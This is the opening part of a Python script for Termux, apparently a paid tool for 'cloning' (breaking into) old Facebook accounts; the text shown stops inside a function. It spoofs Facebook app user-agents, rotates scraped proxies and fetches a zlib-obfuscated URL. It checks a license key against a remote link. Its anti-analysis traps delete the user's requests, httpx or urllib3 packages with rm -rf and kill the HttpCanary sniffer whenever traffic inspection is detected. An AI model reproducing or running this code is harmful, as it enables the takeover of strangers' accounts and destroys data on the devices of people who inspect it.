#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys,uuid,getpass
import os,base64,zlib,pip,urllib
import os,zlib,time,datetime
import pycurl
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from time import localtime as lt
import os
import requests
import httpx
import os
import os,zlib
from time import localtime as lt
from os import system as osRUB
from os import system as cmd
os.system('clear')
try:
    import requests 
except ImportError:
    print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m INSTALLING REQUESTS')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m INSTALLING FUTURES')
    os.system('pip install futures')    
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
from urllib.request import Request, urlopen
from io import BytesIO
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as MrXIDI
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
import requests,bs4,json,os,sys,random,datetime,time,re,string
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ STORAGE ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
try:os.system('rm -rf /sdcard/..txt');open('/sdcard/..txt','a').write(' ')
except PermissionError:os.system('clear');print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m PLEASE ENABLE STORAGE PERMISSION TO CONTINUE');os.system('termux-setup-storage');exit()
try:os.makedirs('/sdcard/ERROR-ZONE')
except:pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ ETC MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-75505','GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LOOP ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[];cid=[];ugen = [];rug = [];ruz = []
proxies = []
use_proxy = True
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ COLOUR ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
#BU= '\033[1;34m';A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;46m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
P = '\x1b[1;97m'
M = '\033[1;33m'
H = '\033[1;32m'
K = '\x1b[1;97m'
B = '\x1b[1;96m'
U = '\x1b[1;95m'
O = '\x1b[1;97m'
R = '\x1b[38;5;246m'
N = '\x1b[0m'
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ SECURITY-CODE ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
site = '/data/data/com.termux/files/usr/lib/python3.12/site-packages/'
alart=(f" \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m DO NOT TRY TO FUCK YOUR MOM...")
if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
    exit(' \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m SOMETHING WENT WRONG')
py3_edit = "/data/data/com.termux/files/usr/lib/python3.12/http/client.py"
with open(py3_edit,'r') as data:
    found = data.read()
    if "print(data.decode())" in str(found):exit()
    else:pass
try:
    mr_error=f'{site}requests/'
    if not 'print' in open(mr_error+'sessions.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
try:
    mr_error1=f'{site}requests/'
    if not 'print' in open(mr_error1+'models.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
try:
    mr_error2=f'{site}requests/'
    if not 'print' in open(mr_error2+'api.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
try:
    king=f'{site}requests/'
    if not 'sys.stdout.write' in open(king+'sessions.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
try:
    qeen=f'{site}requests/'
    if not 'sys.stdout.write' in open(qeen+'models.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
try:
    don=f'{site}requests/'
    if not 'sys.stdout.write' in open(don+'api.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
with open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/auth.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
try:
    a=open('requests/sessions.py','r').read()
    if 'print' in a:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    b=open('requests/api.py','r').read()
    if 'print' in b:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    c=open('requests/models.py','r').read()
    if 'print' in c:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    d=open('httpx/_api.py','r').read()
    if 'print' in d:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    e=open('httpx/_auth.py','r').read()
    if 'print' in e:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    f=open('httpx/_models.py','r').read()
    if 'print' in f:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    g=open('requests/sessions.py','r').read()
    if 'sys.stdout.write' in g:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    h=open('requests/api.py','r').read()
    if 'sys.stdout.write' in h:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    h=open('requests/models.py','r').read()
    if 'sys.stdout.write' in h:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    ii=open('httpx/_api.py','r').read()
    if 'sys.stdout.write' in ii:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    j=open('httpx/_auth.py','r').read()
    if 'sys.stdout.write' in j:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    k=open('httpx/_models.py','r').read()
    if 'sys.stdout.write' in k:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    l=open('requests/api.py', 'r').read()
    if "verify = False" in l:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    m=open('requests/sessions.py', 'r').read()
    if "self.verify = False" in m:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    n=open(f'urllib3/connection.py', 'r').read()
    if str("cert_reqs = 'CERT_NONE'") in n:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/urllib3');exit(f"{alart}")
    else:pass
except Exception as e:pass
def clr():
    try:
        data = os.listdir('/sdcard')
        if 'Android' in data:
            os.system('clear');print(f' \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m DONT TRY BYPASS & CAPTURE MOTHER FUCKER\n \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m YOUR SYSTEM FUCKED BY ETHAN');exit()
        else:exit()
    except:exit()
from requests import api
x = open(api.__file__,'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
else:
    pass
from requests import sessions
x = open(sessions.__file__,'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
else:
    pass
from requests import models
x = open(models.__file__,'r').read()
if "print" in x:
    clr()
elif "sys.stdout.write" in x:
    clr()
else:
    pass
from os import path,system
if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
    pass
else:
    print(f" \x1b[1;91m[\x1b[1;92m!\x1b[1;91m] \x1b[1;91m BRO TURN OFF PROTECTER THEN RUN TOOL");exit()
os.system('chmod 700 /data/data/com.termux/files/usr/bin >/dev/null 2>&1')
os.system('pkill -f httcanary >/dev/null 2>&1')
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ BIT ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
import os, platform, time, sys
os.system('clear')
import os, platform, time, sys
try:
 import requests
except:os.system("pip uninstall requests -y;pip install requests")
os.system('git pull --quiet 2>/dev/null')
bit = platform.architecture()[0]
if bit == '64bit':
 print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m YOU ARE 64BIT USER')
 time.sleep(4)
elif bit == '32bit':
 print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m YOU ARE 32BIT USER')
 time.sleep(4)
princp=[]
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ APPROVAL SYSTEM ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
xny = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5OKK)\xcb1442\xd0O,\xd0\xcfM\xcc\xcc\xd3\xcfJ\x03\x001"\x13\xc6')
update = requests.get(xny).text
myid=uuid.uuid4().hex[:5].upper()
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.errorold-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.errorold-cov', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.errorold-cov', 'r').read()
kex=(f"{uid}{key1}1107122E{uid}1107122E")
key2 = base64.b64encode(str(f"{kex}").encode('utf-8'))
key=(f"{key2}")
licu=(f"{uid}9XOJW27JBA17291")
fkeyx = key.replace("b'","").replace("'","")
myweb2 = requests.get("YOUR LINK").text
def approval():
    clear()
    try:
        x = requests.get("YOUR LINK").text
        if kex in myweb2:
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m YOUR KEY IS SUCCESSFULLY APPROVED')
           menu()
        else:
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m TOOL IS PAID TOOLS NOT FREE USER INBOX ME')
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m ONLY FOR PAID USER CONTACT TO ADMIN')
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m ONLY ACTIVE ID CLONE 99%')
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m ONLY OLD ID CLONING')
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m LOGIN 70% 80% 90%')
           linex()
           print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m YOUR KEY : \x1b[1;92m{kex}')
           linex()
           input(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m IF U WANT USE TOOL THEN PRESS ENTER ')
           os.system(f"termux-open-url https://wa.me/+YOUR PHONE NUMBER?text={kex}")
           approval()
    except requests.exceptions.ConnectionError:
        print(f' \x1b[1;91m[\x1b[1;92m-\x1b[1;91m] \x1b[1;97m NO INTERNET CONNECTION...')
        exit()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ PROX ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
try:
    prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt', 'w').write(prox)
except:
    print('INTERNET ERROR')
    sys.exit()
xvx = open('.prox.txt', 'r').read().splitlines()

def load_proxies():
    global proxies
    try:
        r = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt')
        proxies = r.text.strip().split('\n')
    except:
        proxies = []
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LINEX ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
sys.stdout.write('\x1b]2;<💚MR.ERROR💚>\x07')
def clear():os.system('clear');print(logo)
def linex():print(f'\x1b[1;97m════════════════════════════════════════════════')
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ OLD UA ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
class UserAgentGenerator:
    def __init__(self):
        self.custom_user_agents = [
            'Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36 [FBAN/FB4A;FBAV/395.0.0.35.120;FBBV/345678;FBDM/{density=2.0,width=720,height=1600};FBLC/en_US;FBRV/412345;FBCR/T-Mobile;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A127F;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]',
            '[FBAN/Orca-Android;FBAV/570.0.0.388.460;FBBV/91567890;FBDM/{density=2.75,width=1080,height=2400};FBLC/en_US;FBCR/T-Mobile;FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.orca;FBDV/moto g52;FBSV/13;FBOP/1;FBCA/arm64-v8a;]']
    def _generate_mozilla_user_agent(self):
        android_version = random.randint(4, 13)
        device = random.choice(('SM-G900F', 'SM-G920F', 'SM-T535'))
        resolution = random.choice(('{density=1.5,width=720,height=1280}', '{density=3.5,width=1440,height=3040}', '{density=2.5,width=1080,height=2400}'))
        chrome_version = f"{random.randint(100, 150)}.0.0.0"
        return (f"Mozilla/5.0 (Linux; Android {android_version}; {device}) "
                f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} "
                f"Mobile Safari/537.36 [{resolution}]")
    def _generate_facebook_user_agent(self):
        fb_versions = ['143.0.0.19.100', '81.0.0.22.70']
        build_versions = ['282124661', '144693238']
        fb_version = random.choice(fb_versions)
        build_version = random.choice(build_versions)
        lang = random.choice(('en_US', 'en_GB', 'en_PK', 'en_PH'))
        carrier = random.choice(('Zong', 'Jazz', 'Telenor'))
        app = random.choice(('com.facebook.katana', 'com.facebook.orca', 'com.facebook.mlite'))
        device = random.choice(('Xiaomi', 'Infinix', 'Samsung'))
        model = random.choice(('X5510', 'X601', 'Xiaomi 14 Ultra'))
        resolution = random.choice(('{density=1.5,width=720,height=1280}', '{density=3.5,width=1440,height=3040}', '{density=2.5,width=1080,height=2400}'))
        android_version = random.randint(4, 13)
        return (f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{build_version};FBDM/{resolution};"
                f"FBLC/{lang};FBCR/{carrier};FBMF/{device};FBDV/{model};"
                f"FBSV/Android {android_version};FBPN/{app}]")
    def _generate_dalvik_user_agent(self):
        dalvik_version = f"{random.randint(1, 3)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
        android_version = random.randint(4, 13)
        device = random.choice(('SM-G920F', 'SM-T535',))
        return (f"Dalvik/{dalvik_version} (Linux; U; Android {android_version}; {device})")
    def _generate_iphone_user_agent(self):
        ios_version = random.randint(6, 17)
        device = random.choice(('iPhone 5', 'iPhone 6',))
        resolution = random.choice(('{density=2.0,width=750,height=1334}', '{density=3.0,width=1125,height=2436}', '{density=3.5,width=1242,height=2688}'))
        safari_version = f"{random.randint(14, 16)}.0"
        return (f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_version} like Mac OS X) "
                f"AppleWebKit/537.36 (KHTML, like Gecko) Version/{safari_version} "
                f"Mobile/15E148 Safari/537.36 [{resolution}]")
    def _generate_facebook_orca_user_agent(self):
        return self._generate_facebook_user_agent().replace('FB4A', 'Orca-Android').replace('katana', 'orca')
    def _generate_facebook_katana_user_agent(self):
        return self._generate_facebook_user_agent()
    def generate_user_agent(self):
        user_agent_type = random.choice(('Mozilla', 'Facebook', 'Dalvik', 'iPhone', 'FacebookOrca', 'FacebookKatana', 'Custom'))
        if user_agent_type == 'Mozilla':
            return self._generate_mozilla_user_agent()
        elif user_agent_type == 'Facebook':
            return self._generate_facebook_user_agent()
        elif user_agent_type == 'Dalvik':
            return self._generate_dalvik_user_agent()
        elif user_agent_type == 'iPhone':
            return self._generate_iphone_user_agent()
        elif user_agent_type == 'FacebookOrca':
            return self._generate_facebook_orca_user_agent()
        elif user_agent_type == 'FacebookKatana':
            return self._generate_facebook_katana_user_agent()
        elif user_agent_type == 'Custom':
            return random.choice(self.custom_user_agents)
user_agent_generator = UserAgentGenerator()

def ua():
    ver = str(random.choice(range(77, 500)))
    ver2 = str(random.choice(range(57, 77)))
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36"

def Samsung():
    Anderson = random.choice([
        '10', '13', '7.0.0', '7.1.1', '9', '12', '11', '9.0', 
        '8.0.0', '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1', 
        '6.0.1', '9.0.1'
    ])
    model = random.choice([
        'GT-I9505', 'SM-T835', 'SM-S901U', 'MMB29K', 'SM-S134DL', 
        'SM-J250F', 'SM-A217F', 'SM-A326B', 'SM-A125F', 'SM-A720F', 
        'SM-A326U', 'SM-G532M', 'SM-J410G', 'SM-A205GN', 'SM-A505GN', 
        'SM-G930F', 'SM-J210F', 'SM-N9005', 'SM-J210F'
    ])
    vir = str(random.randint(111111111, 999999999))
    cho = str(random.randint(43, 447))
    fb = random.choice([
        'com.facebook.katana|FB4A',
        'com.facebook.orca|Orca-Android'
    ])
    FBAN, platform = fb.split('|')
    ua = (
        f'Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/LRX22C) '
        f'[FBAN/{FBAN};FBAV/{cho}.0.0.15.89;FBPN/{platform};FBLC/sv_SE;'
        f'FBBV/{vir};FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/{model};'
        f'FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{{density={random.randint(1, 3)}.0,'
        f'width={random.randint(720, 1500)},height={random.randint(1500, 2000)}}};'
        f'FB_FW/1;]'
    )
    return ua

def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])

def generate_user_agent():
